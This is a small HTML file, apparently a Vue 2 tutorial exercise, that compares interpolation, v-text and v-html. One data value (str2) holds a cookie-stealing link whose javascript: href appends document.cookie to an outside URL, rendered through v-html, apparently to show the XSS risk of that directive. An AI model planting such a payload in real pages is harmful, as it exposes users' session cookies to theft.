<!DOCTYPE html>
<html lang='en'>
 <head>
  <title>Document</title>
  <script src='../js/vue.js'></script>
</head>
<body>
  <div id='root'>
    <h2>{{name}}</h2>
    <h2 v-text="name"></h2>
    <h2 v-html="str"></h2>
    <h2 v-html="str2"></h2>
  </div>

  <script type='text/javascript'>
    Vue.config.productionTip = false // 取消Vue的生产提示

    const vm = new Vue({
      el:'#root',
      data: {
        name: '尚硅谷',
        str: '<h3>你好啊</h3>',
        str2: '<a href=javascript:location.href="http://www.baidu.com?" + document.cookie>好东西</a>'
      }
    })
  </script>
</body>
</html>
